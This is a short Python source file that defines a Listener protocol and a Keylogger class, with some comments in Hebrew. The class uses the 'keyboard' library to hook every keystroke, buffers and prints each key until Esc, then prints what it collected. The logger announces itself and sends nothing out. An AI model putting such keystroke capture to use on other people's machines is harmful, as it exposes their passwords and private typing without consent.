from typing import List, Protocol
import keyboard

class Listener(Protocol):
    buffer: List[str]  # buffer to store the data

    """
    Listener is a protocol that defines the interface for listening to data.

    it may be implemented by classes that listen to data in different ways.
    such as:
        Listen to keyboard events
        Listen to mouse events
        Listen to file changes
    """

    def start(self) -> None:
        """
        start listening to data.
        """
        ...

    def stop(self) -> None:
        """
        stop listening to data.
        """
        ...

    def get_data(self) -> List[str]:
        """
        get the data that has been collected and reset the buffer.
        """
        ...

class Keylogger:
    def __init__(self):
        self.buffer: List[str] = []

    def start(self) -> None:
        """
        start listening to keyboard events.
        """
        keyboard.hook(self._on_key_event)
        print("Keylogger started. Press 'Esc' to stop.")

    def stop(self) -> None:
        """
        stop listening to keyboard events.
        """
        keyboard.unhook_all()
        print("Keylogger stopped.")

    def get_data(self) -> List[str]:
        """
        get the data that has been collected and reset the buffer.
        """
        data = self.buffer.copy()
        self.buffer.clear()  # איפוס ה-buffer
        return data

    def _on_key_event(self, event):
        """
        internal method to handle key events.
        """
        self.buffer.append(event.name)
        print(f"Key pressed: {event.name}")

# יצירת מופע של keylogger
keylogger = Keylogger()

# התחלת keylogger
keylogger.start()

# חכה עד שלוחצים על ESC לפני שסוגרים את התוכנית
keyboard.wait('esc')

# עצירת keylogger
keylogger.stop()

# קבלת הנתונים שנאספו
data = keylogger.get_data()
print("Data collected:", data)
